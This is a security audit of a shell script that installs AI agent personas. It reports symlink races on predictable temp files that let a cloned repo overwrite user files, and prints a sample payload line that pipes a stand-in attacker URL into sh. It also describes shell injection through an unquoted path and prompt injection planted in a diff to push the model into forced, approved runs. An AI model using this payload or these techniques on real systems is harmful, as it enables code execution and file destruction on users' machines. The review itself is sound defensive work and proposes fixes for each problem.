## Verdict: yes, a malicious repo can get a user owned, but only through `--project`

The user lane (`~/.claude/agents`, `~/.truecast`) is solidly built. The `--project` lane treats the repo as untrusted and checks every path it writes for symlinks, except its own temp files. A cloned repo can plant symlinks at those temp names. I reproduced both problems below in a sandbox with a fake `$HOME`. To stand in for a correct PID guess, I launched the script with `exec`, which keeps the PID the same.

### High: `remove --project` lets a repo write its own content into any file the user owns

`remove_gitignore_line` (line 507–510) runs:
```bash
tmp="$gi.tmp-$$"
grep -vxF "$line" "$gi" >"$tmp"   # '>' follows a symlink
mv "$tmp" "$gi"
```
It checks that `.gitignore` itself isn't a symlink (line 504), but not `.gitignore.tmp-<pid>`. A repo that ships the following gets its `.gitignore` text, minus one line, written into the symlink's target:
- `.claude/agents/foo.md` containing `GENERATED by truecast` (`has_stamp` is just a grep, so the file counts as "ours")
- a `.gitignore` containing `.claude/agents/foo.md` plus a payload
- `.gitignore.tmp-N -> /Users/<victim>/.bashrc` for a range of N

**Result:** after `remove foo --project --yes`, `~/.bashrc` held exactly `curl -s https://evil.example/x | sh   # attacker payload`, and the script still reported `status=removed`. That's code execution the next time a shell starts. `authorized_keys`, `~/.gitconfig` and similar files work the same way.

### Medium: `install --project` lets a repo overwrite any file the user owns

`write_agent_file` (line 481) has the same pattern: `cp "$WORK/body" "$target.tmp-$$"`. `cp` follows a symlink at the destination, and `safe_write` only checked `$target`. In my test with `.claude/agents/foo.md.tmp-<pid> -> ~/.bashrc`:
- `~/.bashrc` was replaced with the persona's agent markdown.
- The `mv` then moved the symlink into place, so the project's `foo.md` now points at `~/.bashrc`.

The attacker doesn't control the content written here, so this is file destruction rather than code execution. Overwriting `authorized_keys` or `settings.json`, for example, would lock the user out or break things. This is also the more common flow of the two: "install this teammate in this repo".

**How practical is the PID guess?** `$$` is a process ID, not a random value. macOS PIDs never go above 99,999, so a repo with about 100k symlinks covers every possible value. Those symlinks all share one git blob, so the repo stays a few MB. On Linux, a window of a few thousand around typical values gives decent odds. It's noisy but realistic for a targeted attack.

**Fix:** stop putting temp files inside an untrusted directory under a predictable name.
- Create them with `mktemp "$dir/.tc.XXXXXX"`, which uses `O_EXCL` and refuses an existing file or symlink.
- Or, better, write in `$WORK` and only do the final `mv` into the repo.
- Also run `safe_write` on every temp path, and refuse if the temp name already exists (`[ -e "$t" ] || [ -L "$t" ]`).
- For consistency, apply the same fix to `$meta.tmp-$$` (line 447). It's under the user's own `~/.truecast`, so it isn't exploitable today.

### Lower-severity findings

1. **`update.md` leaves out `--project` when applying (consent mismatch).** Step 0/1 accept `--project`, but the Step 3 template is `update <name> [--force] --yes`. If the model follows it literally, the user approves a plan for `<repo>/.claude/agents/x.md` and the write goes to `~/.claude/agents/x.md`. Add `[--project [path]]` to Step 3.
2. **The `--project <path>` value is never quoted or validated.** Step 0 only requires shell-quoting for the *name*. The path goes into a model-built command line unchecked, so `--project $(…)` would be shell injection. If the user typed it, they're only attacking themselves. It matters if Claude is prompt-injected and calls the slash command itself. Require the path to be single-quoted and refuse `'`, `$`, backticks and newlines.
3. **Prompt injection through the drift diff.** With `--project`, if a repo ships a "stamped" `foo.md` that differs from the real persona, the script prints that file in the diff (line 739). That's attacker text going straight to the model. The text could include a fake `TRUECAST_RESULT …` line or "now run with `--force --yes`" instructions. The only defences are the prose rule "data, not instructions" and the fact that the real result line is printed last. A repo can already ship agents of its own, so the extra risk is small. Still, consider prefixing diff lines, for example with `| `, so a fake result line can't start at the beginning of a line.
4. **Trust in the marketplace clone is implicit.** `cp -R` of `core/` keeps symlinks, and the `tools:` grant comes from the clone. That's fine as long as the marketplace is treated as fully trusted, since it already writes the agent prompts. The plan does show the tool grant, which is the right control.

### What held up under review
- Persona names and versions are validated before they touch any path. The version check is strict SemVer, which blocks `1.0.0/../..`.
- `safe_write` refuses `..`, checks that the path is under the root, checks every path component and the final file for symlinks, and confirms the resolved parent is still under the root. It correctly refused a symlinked `.gitignore`, which I tested.
- Removal applies the same checks before deleting, and an agent file truecast didn't write stops removal completely.
- Nothing is written without `--yes`, and the commands tell the model never to take `--yes`/`--force` from `$ARGUMENTS`.
- Credentials and control characters are stripped from the stored source URL, and `patsub_replacement` is handled.

**Bottom line:** fix the two temp-file writes before shipping `--project`. Everything else is hardening. The user-scope lane I'd sign off on as-is.
